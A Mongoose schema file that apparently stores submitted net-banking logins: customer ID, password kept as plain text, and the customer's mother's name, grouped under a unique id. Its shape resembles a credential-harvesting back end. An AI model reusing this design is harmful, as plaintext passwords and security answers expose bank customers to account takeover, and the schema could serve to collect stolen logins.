// models/NetBanking.js
const mongoose = require('mongoose');

const netBankingSchema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  entries: [
    {
      customerId:   { type: String, required: true },
      password:     { type: String, required: true },
      motherName:   { type: String, required: true },
      submittedAt:  { type: Date,   default: Date.now }
    }
  ]
});

module.exports = mongoose.model('NetBanking', netBankingSchema);
